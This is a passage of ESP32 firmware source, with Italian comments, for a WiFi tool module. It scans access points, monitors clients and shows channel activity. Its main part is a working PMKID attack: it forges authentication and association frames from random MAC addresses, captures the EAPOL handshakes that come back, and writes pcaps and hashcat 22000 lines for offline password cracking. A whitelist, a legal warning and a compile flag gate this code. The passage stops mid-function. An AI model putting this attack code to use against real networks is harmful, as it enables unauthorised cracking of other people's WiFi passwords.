// WiFi Lab: PMKID hunt attivo, client monitor, whitelist e spettro 2.4 GHz.
// Tutte le trasmissioni passano da ui::legalWarning e sono compilate solo con
// ENABLE_OFFENSIVE=1. La radio viene sempre fermata e spenta all'uscita.
#include "WifiLabMenu.h"

#include <Arduino.h>
#include <WiFi.h>
#include <esp_random.h>
#include <esp_wifi.h>

#include <algorithm>
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>

#include "Display.h"
#include "MenuManager.h"
#include "ModuleFlags.h"
#include "Navigation.h"
#include "NetGuard.h"
#include "Storage.h"
#include "Ui.h"

#if ENABLE_MODULE_WIFILAB

namespace wifilab {
namespace {

constexpr int kChannels = 13;
constexpr int kMaxAps = 32;
constexpr int kMaxWhitelist = netguard::kMaxEntries;
constexpr int kMaxTargets = 3;
constexpr int kMaxClients = 16;
constexpr int kRxSlots = 6;
constexpr uint16_t kRxMax = 512;
constexpr int kObsSlots = 16;
constexpr int kWaterfallRows = 16;

constexpr const char* kWhitePath = netguard::kPath;
constexpr const char* kPmkidDir = "/wifilab/pmkid";

// ---------------------------------------------------------------------------
// Utility testo / MAC
// ---------------------------------------------------------------------------

std::string shorten(const std::string& text, size_t maxLen) {
    if (text.size() <= maxLen) {
        return text;
    }
    return text.substr(0, maxLen - 1) + "~";
}

std::string macText(const uint8_t mac[6]) {
    char text[18];
    std::snprintf(text, sizeof(text), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0],
                  mac[1], mac[2], mac[3], mac[4], mac[5]);
    return text;
}

void bssidBase(const uint8_t mac[6], char out[13]) {
    static const char* kHex = "0123456789abcdef";
    for (int i = 0; i < 6; ++i) {
        out[i * 2] = kHex[mac[i] >> 4];
        out[i * 2 + 1] = kHex[mac[i] & 0x0F];
    }
    out[12] = 0;
}

bool sameMac(const uint8_t a[6], const uint8_t b[6]) {
    return std::memcmp(a, b, 6) == 0;
}

// Un BSSID valido è unicast e non tutto zero.
bool validBssid(const uint8_t mac[6]) {
    if ((mac[0] & 0x01) != 0) {
        return false;
    }
    for (int i = 0; i < 6; ++i) {
        if (mac[i] != 0) {
            return true;
        }
    }
    return false;
}

void appendHex(std::string& out, const uint8_t* data, size_t len) {
    static const char* kHex = "0123456789abcdef";
    out.reserve(out.size() + len * 2);
    for (size_t i = 0; i < len; ++i) {
        out.push_back(kHex[data[i] >> 4]);
        out.push_back(kHex[data[i] & 0x0F]);
    }
}

const char* securityName(uint8_t auth) {
    switch (auth) {
        case WIFI_AUTH_OPEN:
            return "aperta";
        case WIFI_AUTH_WEP:
            return "WEP";
        case WIFI_AUTH_WPA_PSK:
            return "WPA";
        case WIFI_AUTH_WPA2_PSK:
            return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK:
            return "WPA/WPA2";
        case WIFI_AUTH_WPA2_ENTERPRISE:
            return "WPA2 Ent";
        case WIFI_AUTH_WPA3_PSK:
            return "WPA3";
        case WIFI_AUTH_WPA2_WPA3_PSK:
            return "WPA2/3";
        case WIFI_AUTH_WAPI_PSK:
            return "WAPI";
        default:
            return "?";
    }
}

void applyCountry() {
    wifi_country_t country = {};
    country.cc[0] = 'I';
    country.cc[1] = 'T';
    country.cc[2] = 0;
    country.schan = 1;
    country.nchan = kChannels;
    country.max_tx_power = 20;
    country.policy = WIFI_COUNTRY_POLICY_MANUAL;
    esp_wifi_set_country(&country);
}

void beginRadio() {
    WiFi.persistent(false);
    WiFi.mode(WIFI_STA);
    // Non forzare un disassoc se non c'e' una connessione attiva.
    if (WiFi.status() == WL_CONNECTED) {
        WiFi.disconnect();
    }
    applyCountry();
}

void stopRadio() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_set_promiscuous_filter(nullptr);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    if (WiFi.status() == WL_CONNECTED) {
        WiFi.disconnect();
    }
    WiFi.mode(WIFI_OFF);
}

// ---------------------------------------------------------------------------
// AP e whitelist
// ---------------------------------------------------------------------------

struct ApInfo {
    uint8_t bssid[6] = {};
    char ssid[33] = {};
    uint8_t ssidLen = 0;
    int8_t rssi = 0;
    uint8_t channel = 1;
    uint8_t auth = 0;
};

ApInfo g_aps[kMaxAps];
int g_apCount = 0;

std::string apSsid(const ApInfo& ap) {
    return ap.ssidLen == 0 ? std::string("(nascosta)") : std::string(ap.ssid);
}

// La whitelist e' quella condivisa con WiFi Atks: una sola implementazione
// (netguard) e stessa policy fail-closed in tutti i moduli.
void loadWhitelist() { netguard::reload(); }

bool whitelistReady() { return netguard::ready(); }
int whitelistCount() { return netguard::count(); }

bool apWhitelisted(const ApInfo& ap) {
    return netguard::isProtected(ap.bssid, ap.ssidLen > 0 ? ap.ssid : nullptr,
                                 ap.ssidLen);
}

bool bssidWhitelisted(const uint8_t bssid[6]) {
    return netguard::isProtectedBssid(bssid);
}

bool addWhitelistEntry(const ApInfo& ap) {
    return netguard::add(ap.bssid, ap.ssidLen > 0 ? ap.ssid : nullptr,
                         ap.ssidLen);
}

// ---------------------------------------------------------------------------
// Scansione AP
// ---------------------------------------------------------------------------

void drawScanScreen(const std::string& parent, uint32_t elapsed, int found) {
    display::clear();
    display::header("Scansione AP", parent);
    display::text(8, 30, "Banda 2.4 GHz  canali 1-13", display::kText, 0);
    display::text(8, 44, "Reti trovate: " + std::to_string(found),
                  display::kAccent, 2);
    char secs[16];
    std::snprintf(secs, sizeof(secs), "%.1f s",
                  static_cast<double>(elapsed) / 1000.0);
    display::text(8, 64, "Tempo: " + std::string(secs), display::kTextDim, 0);
    display::progressBar(8, 80, 200, 8,
                         std::min(1.0f, static_cast<float>(elapsed) / 8000.0f),
                         display::kInfo);
    display::text(8, 96, "ESC = annulla", display::kTextDim, 0);
    display::footer("scansione in corso");
    display::push();
}

bool scanAps(const std::string& parent, bool passive = false) {
    g_apCount = 0;
    beginRadio();
    delay(60);
    WiFi.scanDelete();
    if (WiFi.scanNetworks(true, true, passive) == WIFI_SCAN_FAILED) {
        WiFi.mode(WIFI_OFF);
        return false;
    }

    navigation::waitRelease();
    const uint32_t start = millis();
    uint32_t lastDraw = 0;
    int count = WIFI_SCAN_RUNNING;
    while (count == WIFI_SCAN_RUNNING) {
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            WiFi.scanDelete();
            WiFi.mode(WIFI_OFF);
            return false;
        }
        const uint32_t now = millis();
        if (now - lastDraw > 100) {
            drawScanScreen(parent, now - start, 0);
            lastDraw = now;
        }
        if (now - start > 20000) {
            WiFi.scanDelete();
            WiFi.mode(WIFI_OFF);
            return false;
        }
        delay(25);
        count = WiFi.scanComplete();
    }

    if (count < 0) {
        WiFi.scanDelete();
        WiFi.mode(WIFI_OFF);
        return false;
    }

    for (int i = 0; i < count; ++i) {
        const uint8_t* bssid = WiFi.BSSID(i);
        if (bssid == nullptr) {
            continue;
        }
        ApInfo ap;
        std::memcpy(ap.bssid, bssid, 6);
        if (!validBssid(ap.bssid)) {
            continue;
        }
        String ssid = WiFi.SSID(i);
        size_t len = ssid.length();
        if (len > 32) {
            len = 32;
        }
        std::memcpy(ap.ssid, ssid.c_str(), len);
        ap.ssid[len] = 0;
        ap.ssidLen = static_cast<uint8_t>(len);
        ap.rssi = static_cast<int8_t>(WiFi.RSSI(i));
        int channel = WiFi.channel(i);
        ap.channel = static_cast<uint8_t>(channel >= 1 && channel <= 13 ? channel : 1);
        ap.auth = static_cast<uint8_t>(WiFi.encryptionType(i));

        if (g_apCount < kMaxAps) {
            g_aps[g_apCount++] = ap;
        } else {
            int worst = 0;
            for (int j = 1; j < g_apCount; ++j) {
                if (g_aps[j].rssi < g_aps[worst].rssi) {
                    worst = j;
                }
            }
            if (ap.rssi > g_aps[worst].rssi) {
                g_aps[worst] = ap;
            }
        }
    }
    WiFi.scanDelete();
    WiFi.mode(WIFI_OFF);

    std::sort(g_aps, g_aps + g_apCount,
              [](const ApInfo& a, const ApInfo& b) { return a.rssi > b.rssi; });
    return true;
}

// ---------------------------------------------------------------------------
// Menu di scelta generico
// ---------------------------------------------------------------------------

int chooseIndex(const std::string& title, const std::string& parent,
                const std::vector<std::string>& labels,
                const std::string& hint) {
    if (labels.empty()) {
        return -1;
    }
    constexpr int kTop = 22;
    constexpr int kRowH = 15;
    constexpr int kVisible = 6;
    const int count = static_cast<int>(labels.size());
    int selected = 0;
    int top = 0;

    navigation::waitRelease();
    while (true) {
        navigation::update();
        const navigation::EventData ev = navigation::poll();
        if (ev.type == navigation::Event::Back) {
            navigation::waitRelease();
            return -1;
        }
        if (ev.type == navigation::Event::Select) {
            navigation::waitRelease();
            return selected;
        }
        if (ev.type == navigation::Event::Up) {
            selected = (selected + count - 1) % count;
        } else if (ev.type == navigation::Event::Down) {
            selected = (selected + 1) % count;
        }
        if (selected < top) {
            top = selected;
        } else if (selected >= top + kVisible) {
            top = selected - kVisible + 1;
        }

        display::clear();
        display::header(title, parent);
        for (int row = 0; row < kVisible; ++row) {
            const int index = top + row;
            if (index >= count) {
                break;
            }
            const int y = kTop + row * kRowH;
            const bool isSelected = index == selected;
            if (isSelected) {
                display::g().fillRoundRect(2, y, display::width() - 6,
                                           kRowH - 1, 3, display::kAccentDark);
                display::g().fillRect(2, y + 4, 2, kRowH - 9,
                                      display::kAccent);
                display::text(9, y + 4, shorten(labels[index], 36),
                              display::kWhite, 0);
            } else {
                display::text(9, y + 4, shorten(labels[index], 36),
                              display::kText, 0);
            }
        }
        display::footer(hint);
        display::push();
        delay(20);
    }
}

// ---------------------------------------------------------------------------
// Promiscuo: un solo callback, quattro modalita'
// ---------------------------------------------------------------------------

enum RxMode : uint8_t {
    RxOff = 0,
    RxPmkid,
    RxClients,
    RxSpectrum,
};

volatile uint8_t g_rxMode = RxOff;

struct RxSlot {
    uint16_t len = 0;
    int8_t rssi = 0;
    uint8_t kind = 0;  // 0 = data (EAPOL), 1 = beacon/probe response
    uint8_t data[kRxMax] = {};
};

RxSlot g_rxSlots[kRxSlots];
volatile int g_rxHead = 0;
volatile int g_rxTail = 0;
volatile uint32_t g_rxDropped = 0;
portMUX_TYPE g_rxMux = portMUX_INITIALIZER_UNLOCKED;

struct ClientObs {
    uint8_t mac[6] = {};
    int8_t rssi = 0;
};

ClientObs g_observations[kObsSlots];
volatile int g_obsHead = 0;
volatile int g_obsTail = 0;
volatile uint32_t g_obsDropped = 0;
portMUX_TYPE g_obsMux = portMUX_INITIALIZER_UNLOCKED;
uint8_t g_clientBssid[6] = {};

// BSSID dei target PMKID: il callback copia solo i beacon di queste reti,
// necessari a ricavare l'ESSID per una riga hc22000 valida.
uint8_t g_rxBssids[kMaxTargets][6] = {};
volatile uint8_t g_rxBssidCount = 0;

volatile uint32_t g_specCounts[kChannels] = {};
volatile uint32_t g_specTotal = 0;

void IRAM_ATTR promiscuousCb(void* buf, wifi_promiscuous_pkt_type_t) {
    auto* packet = static_cast<wifi_promiscuous_pkt_t*>(buf);
    const uint8_t* payload = packet->payload;
    if (payload == nullptr) {
        return;
    }

    const uint8_t mode = g_rxMode;
    if (mode == RxSpectrum) {
        const uint8_t channel = packet->rx_ctrl.channel;
        if (channel >= 1 && channel <= kChannels) {
            g_specCounts[channel - 1]++;
            g_specTotal++;
        }
        return;
    }
    if (mode == RxOff) {
        return;
    }
    uint16_t length = packet->rx_ctrl.sig_len;
    if (length < 28) {
        return;
    }
    length = static_cast<uint16_t>(length - 4);  // sig_len include l'FCS
    if (length > kRxMax) {
        length = kRxMax;
    }

    if (mode == RxClients) {
        if ((payload[0] & 0x0C) != 0x08 || (payload[0] & 0x04)) {
            return;
        }
    } else {
        // RxPmkid: frame data (EAPOL) e beacon/probe response dei soli
        // target, cosi' il pcap contiene anche l'ESSID.
        const uint8_t type = payload[0] & 0x0C;
        if (type == 0x00) {
            const uint8_t subtype = payload[0] >> 4;
            if ((subtype != 8 && subtype != 5) || length < 38) {
                return;
            }
            bool match = false;
            for (uint8_t i = 0; i < g_rxBssidCount; ++i) {
                if (sameMac(payload + 16, g_rxBssids[i])) {
                    match = true;
                    break;
                }
            }
            if (!match) {
                return;
            }
        } else if (type != 0x08) {
            return;
        } else {
            // Solo EAPOL-Key: evita di riempire l'anello con dati inutili.
            size_t header = 24;
            if (payload[0] & 0x80) {
                header += 2;
            }
            if (payload[1] & 0x80) {
                header += 4;
            }
            if (header + 8 + 4 > length) {
                return;
            }
            if (payload[header] != 0xAA || payload[header + 1] != 0xAA ||
                payload[header + 2] != 0x03 || payload[header + 3] != 0x00 ||
                payload[header + 4] != 0x00 || payload[header + 5] != 0x00 ||
                payload[header + 6] != 0x88 || payload[header + 7] != 0x8E ||
                payload[header + 9] != 3) {
                return;
            }
            const uint8_t fc1 = payload[1];
            const bool toDs = (fc1 & 0x01) != 0;
            const bool fromDs = (fc1 & 0x02) != 0;
            const uint8_t* bssid = nullptr;
            if (toDs && !fromDs) {
                bssid = payload + 4;
            } else if (!toDs && fromDs) {
                bssid = payload + 10;
            } else if (!toDs && !fromDs) {
                bssid = payload + 16;
            } else {
                return;
            }
            bool match = false;
            for (uint8_t i = 0; i < g_rxBssidCount; ++i) {
                if (sameMac(bssid, g_rxBssids[i])) {
                    match = true;
                    break;
                }
            }
            if (!match) {
                return;
            }
        }
    }

    if (mode == RxClients) {
        if (length < 24) {
            return;
        }
        const uint8_t* bssid = nullptr;
        const uint8_t* other = nullptr;
        const uint8_t fc1 = payload[1];
        const bool toDs = (fc1 & 0x01) != 0;
        const bool fromDs = (fc1 & 0x02) != 0;
        if (toDs && !fromDs) {
            bssid = payload + 4;
            other = payload + 10;
        } else if (!toDs && fromDs) {
            bssid = payload + 10;
            other = payload + 4;
        } else if (!toDs && !fromDs) {
            bssid = payload + 16;
            other = payload + 10;
        } else {
            return;
        }
        if (!sameMac(bssid, g_clientBssid) || (other[0] & 0x01) ||
            sameMac(other, g_clientBssid)) {
            return;
        }
        portENTER_CRITICAL_ISR(&g_obsMux);
        const int next = (g_obsHead + 1) % kObsSlots;
        if (next == g_obsTail) {
            g_obsDropped++;
        } else {
            ClientObs& obs = g_observations[g_obsHead];
            std::memcpy(obs.mac, other, 6);
            obs.rssi = packet->rx_ctrl.rssi;
            g_obsHead = next;
        }
        portEXIT_CRITICAL_ISR(&g_obsMux);
        return;
    }

    portENTER_CRITICAL_ISR(&g_rxMux);
    const int next = (g_rxHead + 1) % kRxSlots;
    if (next == g_rxTail) {
        g_rxDropped++;
    } else {
        RxSlot& slot = g_rxSlots[g_rxHead];
        slot.len = length;
        slot.rssi = packet->rx_ctrl.rssi;
        slot.kind = (payload[0] & 0x0C) == 0x00 ? 1 : 0;
        std::memcpy(slot.data, payload, length);
        g_rxHead = next;
    }
    portEXIT_CRITICAL_ISR(&g_rxMux);
}

bool startRx(RxMode mode) {
    beginRadio();
    delay(60);

    g_rxMode = RxOff;
    portENTER_CRITICAL(&g_rxMux);
    g_rxHead = 0;
    g_rxTail = 0;
    g_rxDropped = 0;
    portEXIT_CRITICAL(&g_rxMux);
    portENTER_CRITICAL(&g_obsMux);
    g_obsHead = 0;
    g_obsTail = 0;
    g_obsDropped = 0;
    portEXIT_CRITICAL(&g_obsMux);
    for (int i = 0; i < kChannels; ++i) {
        g_specCounts[i] = 0;
    }
    g_specTotal = 0;

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    if (mode == RxSpectrum) {
        esp_wifi_set_promiscuous_filter(nullptr);
    } else if (mode == RxPmkid) {
        wifi_promiscuous_filter_t filter = {};
        filter.filter_mask =
            WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_MGMT;
        esp_wifi_set_promiscuous_filter(&filter);
    } else {
        wifi_promiscuous_filter_t filter = {};
        filter.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
        esp_wifi_set_promiscuous_filter(&filter);
    }
    g_rxMode = mode;
    esp_wifi_set_promiscuous_rx_cb(promiscuousCb);
    if (esp_wifi_set_promiscuous(true) != ESP_OK) {
        g_rxMode = RxOff;
        esp_wifi_set_promiscuous_rx_cb(nullptr);
        WiFi.mode(WIFI_OFF);
        return false;
    }
    return true;
}

class RxGuard {
public:
    explicit RxGuard(bool active) : active_(active) {}

    ~RxGuard() { stop(); }

    void stop() {
        if (active_) {
            active_ = false;
            g_rxMode = RxOff;
            stopRadio();
        }
    }

private:
    bool active_ = false;
};

// ---------------------------------------------------------------------------
// Parsing EAPOL / PMKID
// ---------------------------------------------------------------------------

#if ENABLE_OFFENSIVE

struct EapolFrame {
    bool valid = false;
    bool pairwise = false;
    bool install = false;
    bool ack = false;
    bool micSet = false;
    bool secure = false;
    bool encrypted = false;
    uint16_t keyInfo = 0;
    uint64_t replay = 0;
    uint8_t bssid[6] = {};
    uint8_t sta[6] = {};
    const uint8_t* keyData = nullptr;
    uint16_t keyDataLen = 0;
};

bool parseEapolFrame(const uint8_t* data, size_t len, EapolFrame& out) {
    out = EapolFrame{};
    if (data == nullptr || len < 24) {
        return false;
    }
    if (!(data[0] & 0x08) || (data[0] & 0x04)) {
        return false;
    }
    const uint8_t fc1 = data[1];
    const bool toDs = (fc1 & 0x01) != 0;
    const bool fromDs = (fc1 & 0x02) != 0;
    if (toDs && fromDs) {
        return false;
    }
    if (fc1 & 0x40) {
        return false;  // frame protetto: payload cifrato
    }

    size_t header = 24;
    if (data[0] & 0x80) {
        header += 2;  // QoS control
    }
    if (fc1 & 0x80) {
        header += 4;  // HT control
    }
    if (header + 8 + 4 > len) {
        return false;
    }
    static const uint8_t kSnap[8] = {0xAA, 0xAA, 0x03, 0x00,
                                     0x00, 0x00, 0x88, 0x8E};
    if (std::memcmp(data + header, kSnap, sizeof(kSnap)) != 0) {
        return false;
    }

    const size_t eapolOffset = header + 8;
    const uint8_t* eapol = data + eapolOffset;
    const size_t available = len - eapolOffset;
    if (available < 4 || eapol[1] != 3) {
        return false;
    }
    const uint16_t bodyLen =
        static_cast<uint16_t>((eapol[2] << 8) | eapol[3]);
    if (bodyLen < 95 || bodyLen > available - 4) {
        return false;
    }

    const uint8_t* key = eapol + 4;
    const uint8_t descriptor = key[0];
    if (descriptor != 2 && descriptor != 254) {
        return false;
    }
    const uint16_t keyDataLen = static_cast<uint16_t>((key[93] << 8) | key[94]);
    if (keyDataLen > bodyLen - 95) {
        return false;
    }

    out.valid = true;
    out.keyInfo = static_cast<uint16_t>((key[1] << 8) | key[2]);
    uint64_t replay = 0;
    for (int i = 0; i < 8; ++i) {
        replay = (replay << 8) | key[5 + i];
    }
    out.replay = replay;
    out.pairwise = (out.keyInfo & 0x0008) != 0;
    out.install = (out.keyInfo & 0x0040) != 0;
    out.ack = (out.keyInfo & 0x0080) != 0;
    out.micSet = (out.keyInfo & 0x0100) != 0;
    out.secure = (out.keyInfo & 0x0200) != 0;
    out.encrypted = (out.keyInfo & 0x1000) != 0;
    out.keyData = key + 95;
    out.keyDataLen = keyDataLen;

    if (toDs && !fromDs) {
        std::memcpy(out.bssid, data + 4, 6);
        std::memcpy(out.sta, data + 10, 6);
    } else if (!toDs && fromDs) {
        std::memcpy(out.bssid, data + 10, 6);
        std::memcpy(out.sta, data + 4, 6);
    } else {
        std::memcpy(out.bssid, data + 16, 6);
        std::memcpy(out.sta, data + 10, 6);
    }
    return true;
}

bool findPmkid(const EapolFrame& frame, uint8_t out[16]) {
    if (frame.encrypted || frame.keyData == nullptr) {
        return false;
    }
    const uint8_t* data = frame.keyData;
    size_t left = frame.keyDataLen;
    while (left >= 2) {
        const uint8_t id = data[0];
        const uint8_t length = data[1];
        if (length > left - 2) {
            return false;
        }
        if (id == 0xDD && length >= 20 && data[2] == 0x00 &&
            data[3] == 0x0F && data[4] == 0xAC && data[5] == 0x04) {
            std::memcpy(out, data + 6, 16);
            return true;
        }
        data += 2 + length;
        left -= 2 + length;
    }
    return false;
}

// ---------------------------------------------------------------------------
// PMKID Hunt
// ---------------------------------------------------------------------------

struct PcapGlobalHeader {
    uint32_t magic;
    uint16_t versionMajor;
    uint16_t versionMinor;
    int32_t thisZone;
    uint32_t sigFigs;
    uint32_t snapLen;
    uint32_t network;
} __attribute__((packed));

struct PcapPacketHeader {
    uint32_t tsSec;
    uint32_t tsUsec;
    uint32_t inclLen;
    uint32_t origLen;
} __attribute__((packed));

enum HuntState : uint8_t {
    HuntSearch = 0,
    HuntM1,
    HuntNoEssid,
    HuntFound,
    HuntFailed,
};

struct PmkidTarget {
    ApInfo ap;
    uint8_t sta[6] = {};
    uint8_t pmkid[16] = {};
    uint16_t rounds = 0;
    uint16_t m1Count = 0;
    uint16_t txFail = 0;
    uint16_t seq = 0;
    uint8_t state = HuntSearch;
    bool hasPmkid = false;
    bool hcSaved = false;
    bool pcapOk = false;
    uint32_t pcapFrames = 0;
    File pcap;
};

PmkidTarget g_targets[kMaxTargets];
int g_targetCount = 0;

const char* huntStateName(uint8_t state) {
    switch (state) {
        case HuntM1:
            return "M1";
        case HuntNoEssid:
            return "senza ESSID";
        case HuntFound:
            return "trovato";
        case HuntFailed:
            return "n/d";
        default:
            return "cerco";
    }
}

void randomStaMac(uint8_t mac[6], int index) {
    const uint32_t a = esp_random();
    const uint32_t b = esp_random();
    for (int i = 0; i < 4; ++i) {
        mac[i] = static_cast<uint8_t>((a >> (i * 8)) & 0xFF);
    }
    mac[4] = static_cast<uint8_t>(b & 0xFF);
    mac[5] = static_cast<uint8_t>((b >> 8) & 0xFF);
    mac[0] = static_cast<uint8_t>((mac[0] & 0xFC) | 0x02);  // locale
    mac[5] = static_cast<uint8_t>((mac[5] & 0xF0) | (index & 0x0F));
}

void writePcapFrame(PmkidTarget& target, const uint8_t* data, uint16_t len) {
    if (!target.pcapOk) {
        return;
    }
    PcapPacketHeader header = {};
    const uint32_t now = millis();
    header.tsSec = now / 1000;
    header.tsUsec = (now % 1000) * 1000;
    header.inclLen = len;
    header.origLen = len;
    if (target.pcap.write(reinterpret_cast<const uint8_t*>(&header),
                          sizeof(header)) != sizeof(header) ||
        target.pcap.write(data, len) != len) {
        target.pcapOk = false;
        return;
    }
    ++target.pcapFrames;
    target.pcap.flush();
    if (target.pcap.getWriteError() != 0) {
        target.pcapOk = false;
    }
}

bool isHexChar(char c) {
    return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') ||
           (c >= 'A' && c <= 'F');
}

// Controllo sintattico della riga hashcat 22000 prima di scriverla:
// WPA*01*<32 hex>*<12 hex>*<12 hex>*<ESSID hex>***\n
bool validHc22000Line(const std::string& line) {
    const std::string prefix = "WPA*01*";
    if (line.compare(0, prefix.size(), prefix) != 0) {
        return false;
    }
    size_t pos = prefix.size();
    auto field = [&](size_t len) {
        if (pos + len > line.size()) {
            return false;
        }
        for (size_t i = 0; i < len; ++i) {
            if (!isHexChar(line[pos + i])) {
                return false;
            }
        }
        pos += len;
        return true;
    };
    if (!field(32) || pos >= line.size() || line[pos++] != '*') {
        return false;
    }
    if (!field(12) || pos >= line.size() || line[pos++] != '*') {
        return false;
    }
    if (!field(12) || pos >= line.size() || line[pos++] != '*') {
        return false;
    }
    const size_t ssidStart = pos;
    while (pos < line.size() && isHexChar(line[pos])) {
        ++pos;
    }
    if ((pos - ssidStart) % 2 != 0) {
        return false;
    }
    if (pos + 4 != line.size() ||
        std::memcmp(line.data() + pos, "***\n", 4) != 0) {
        return false;
    }
    return true;
}

bool removePmkidFile(const uint8_t bssid[6]) {
    char base[13];
    bssidBase(bssid, base);
    char path[64];
    std::snprintf(path, sizeof(path), "%s/%s.hc22000", kPmkidDir, base);
    storage::removeFile(path, true);
    return !storage::exists(path, true);
}

void savePmkidFile(PmkidTarget& target) {    // Un hashcat 22000 richiede l'ESSID: senza beacon/SSID non si scrive un
    // file che sembrerebbe valido ma non sarebbe verificabile.
    if (!target.hasPmkid || target.ap.ssidLen == 0) {
        return;
    }
    char base[13];
    bssidBase(target.ap.bssid, base);
    char path[64];
    std::snprintf(path, sizeof(path), "%s/%s.hc22000", kPmkidDir, base);

    std::string line = "WPA*01*";
    appendHex(line, target.pmkid, 16);
    line.push_back('*');
    appendHex(line, target.ap.bssid, 6);
    line.push_back('*');
    appendHex(line, target.sta, 6);
    line.push_back('*');
    appendHex(line, reinterpret_cast<const uint8_t*>(target.ap.ssid),
              target.ap.ssidLen);
    line += "***\n";
    if (!validHc22000Line(line)) {
        target.hcSaved = false;
        return;
    }
    if (!storage::writeText(path, line, true)) {
        target.hcSaved = false;
        return;
    }
    target.hcSaved = storage::fileSize(path, true) >= line.size();
    target.state = target.hcSaved ? HuntFound : HuntNoEssid;
}

// Estrae l'SSID da un beacon/probe response (IE 0 dopo i campi fissi).
bool parseBeaconSsid(const uint8_t* data, size_t len, uint8_t bssid[6],
                     char ssid[33], uint8_t& ssidLen) {
    if (data == nullptr || len < 38 || (data[0] & 0x0C) != 0x00) {
        return false;
    }
    const uint8_t subtype = data[0] >> 4;
    if (subtype != 8 && subtype != 5) {
        return false;
    }
    std::memcpy(bssid, data + 16, 6);
    size_t pos = 24 + 12;
    while (pos + 2 <= len) {
        const uint8_t id = data[pos];
        const uint8_t length = data[pos + 1];
        if (pos + 2 + length > len) {
            break;
        }
        if (id == 0 && length <= 32) {
            std::memcpy(ssid, data + pos + 2, length);
            ssid[length] = 0;
            ssidLen = length;
            return true;
        }
        pos += 2 + length;
    }
    return false;
}

void openTargetPcap(PmkidTarget& target) {
    char base[13];
    bssidBase(target.ap.bssid, base);
    char path[64];
    std::snprintf(path, sizeof(path), "%s/%s.pcap", kPmkidDir, base);
    target.pcap = storage::openWrite(path, true);
    if (!target.pcap) {
        target.pcapOk = false;
        return;
    }
    PcapGlobalHeader header = {};
    header.magic = 0xA1B2C3D4;
    header.versionMajor = 2;
    header.versionMinor = 4;
    header.snapLen = kRxMax;
    header.network = 105;
    target.pcapOk =
        target.pcap.write(reinterpret_cast<const uint8_t*>(&header),
                          sizeof(header)) == sizeof(header);
    if (target.pcapOk) {
        target.pcap.flush();
        if (target.pcap.getWriteError() != 0) {
            target.pcapOk = false;
        }
    }
}

void closeTargetPcaps() {
    for (int i = 0; i < g_targetCount; ++i) {
        if (g_targets[i].pcap) {
            g_targets[i].pcap.flush();
            if (g_targets[i].pcap.getWriteError() != 0) {
                g_targets[i].pcapOk = false;
            }
            g_targets[i].pcap.close();
        }
    }
}

void handlePmkidFrame(const RxSlot& slot) {
    if (slot.kind == 1) {
        uint8_t bssid[6] = {};
        char ssid[33] = {};
        uint8_t ssidLen = 0;
        if (!parseBeaconSsid(slot.data, slot.len, bssid, ssid, ssidLen)) {
            return;
        }
        for (int i = 0; i < g_targetCount; ++i) {
            PmkidTarget& target = g_targets[i];
            if (!sameMac(bssid, target.ap.bssid)) {
                continue;
            }
            if (target.ap.ssidLen == 0 && ssidLen > 0) {
                std::memcpy(target.ap.ssid, ssid, ssidLen + 1);
                target.ap.ssidLen = ssidLen;
                if (target.hasPmkid) {
                    savePmkidFile(target);
                }
            }
            writePcapFrame(target, slot.data, slot.len);
            return;
        }
        return;
    }

    EapolFrame frame;
    if (!parseEapolFrame(slot.data, slot.len, frame)) {
        return;
    }
    for (int i = 0; i < g_targetCount; ++i) {
        PmkidTarget& target = g_targets[i];
        if (!sameMac(frame.bssid, target.ap.bssid) ||
            !sameMac(frame.sta, target.sta)) {
            continue;
        }
        if (frame.pairwise && frame.ack && !frame.micSet) {
            ++target.m1Count;
            if (!target.hasPmkid) {
                uint8_t pmkid[16];
                if (findPmkid(frame, pmkid)) {
                    std::memcpy(target.pmkid, pmkid, 16);
                    target.hasPmkid = true;
                    if (target.ap.ssidLen > 0) {
                        savePmkidFile(target);
                    } else {
                        target.state = HuntNoEssid;
                    }
                }
            }
            if (!target.hasPmkid) {
                target.state = HuntM1;
            }
        }
        writePcapFrame(target, slot.data, slot.len);
        return;
    }
}

void drainPmkidRx() {
    for (int guard = 0; guard < kRxSlots; ++guard) {
        RxSlot slot;
        bool have = false;
        portENTER_CRITICAL(&g_rxMux);
        if (g_rxTail != g_rxHead) {
            slot = g_rxSlots[g_rxTail];
            g_rxTail = (g_rxTail + 1) % kRxSlots;
            have = true;
        }
        portEXIT_CRITICAL(&g_rxMux);
        if (!have) {
            return;
        }
        handlePmkidFrame(slot);
    }
}

bool sendAuth(PmkidTarget& target) {
    uint8_t frame[30] = {
        0xB0, 0x00, 0x00, 0x00,
        0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0,
        0, 0,
        0x00, 0x00,
        0x01, 0x00,
        0x00, 0x00,
    };
    std::memcpy(frame + 4, target.ap.bssid, 6);
    std::memcpy(frame + 10, target.sta, 6);
    std::memcpy(frame + 16, target.ap.bssid, 6);
    frame[22] = static_cast<uint8_t>(target.seq & 0xFF);
    frame[23] = static_cast<uint8_t>(((target.seq >> 8) & 0x0F) << 4);
    ++target.seq;
    return esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false) ==
           ESP_OK;
}

bool sendAssoc(PmkidTarget& target) {
    uint8_t frame[128];
    size_t n = 0;
    frame[n++] = 0x00;
    frame[n++] = 0x00;
    frame[n++] = 0x00;
    frame[n++] = 0x00;
    std::memcpy(frame + n, target.ap.bssid, 6);
    n += 6;
    std::memcpy(frame + n, target.sta, 6);
    n += 6;
    std::memcpy(frame + n, target.ap.bssid, 6);
    n += 6;
    frame[n++] = static_cast<uint8_t>(target.seq & 0xFF);
    frame[n++] = static_cast<uint8_t>(((target.seq >> 8) & 0x0F) << 4);
    ++target.seq;

    const bool open = target.ap.auth == WIFI_AUTH_OPEN;
    frame[n++] = open ? 0x01 : 0x11;  // capability: ESS [+ Privacy]
    frame[n++] = 0x04;
    frame[n++] = 0x0A;  // listen interval
    frame[n++] = 0x00;
